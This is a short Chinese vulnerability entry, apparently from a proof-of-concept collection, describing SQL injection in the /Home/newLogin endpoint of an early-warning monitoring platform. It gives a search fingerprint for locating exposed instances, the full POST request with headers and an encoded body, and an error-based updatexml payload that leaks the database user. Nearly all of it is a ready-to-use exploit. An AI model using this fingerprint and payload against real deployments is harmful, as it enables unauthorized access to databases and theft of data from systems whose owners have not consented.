# 预警监控平台newLogin存在SQL注入漏洞

- **系统**：预警监控平台　|　**类型**：SQL注入　|　**CVE**：—
- **指纹**：`"myCss/phone.css"`
- **请求**：`POST /Home/newLogin HTTP/1.1`
- **关键头**：`Content-Type: application/x-www-form-urlencoded`　`Content-Length: 185`

**请求体 / payload**
```
data=LvF7NkZZRJyO1zXJAT%2FuxSNQv5lgcWR%2FdKqlDuMbMthvwjJDYfUu362DBQWRHe9fhDt7duyHf92vjlfaqtG%2BZWctT5AFerKuEebb1Twup7KlMsbLm3CSLEBWw1AQd6cmls3Ei4ASjehn46vAlq7nvwnmfzZ9D1AlXWCmQsgjxlw%3D
测试Payload：' and updatexml(1, concat('~', user()), null)--
```
- **预期**：200　|　—